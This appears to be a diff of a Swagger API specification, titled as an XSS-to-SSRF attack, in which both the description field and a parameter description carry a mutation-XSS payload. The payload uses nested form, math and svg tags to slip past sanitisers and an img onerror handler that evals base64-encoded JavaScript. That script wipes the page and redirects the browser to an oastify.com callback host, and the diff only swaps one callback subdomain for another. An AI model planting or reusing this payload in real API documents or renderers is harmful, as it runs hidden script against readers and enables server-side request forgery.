@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS TO SSRF ATTACK BY I_EH_DREAMER
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vejExYzM0NWZmeHZzaHRsMjNmN2RtZ3Zncjd4MWxyOWcub2FzdGlmeS5jb20nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vMXJ0YXJ2Y2hjdTk4cDhjYnhyc2hraWMwZHJqaTdhdnoub2FzdGlmeS5jb20nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vejExYzM0NWZmeHZzaHRsMjNmN2RtZ3Zncjd4MWxyOWcub2FzdGlmeS5jb20nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vMXJ0YXJ2Y2hjdTk4cDhjYnhyc2hraWMwZHJqaTdhdnoub2FzdGlmeS5jb20nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
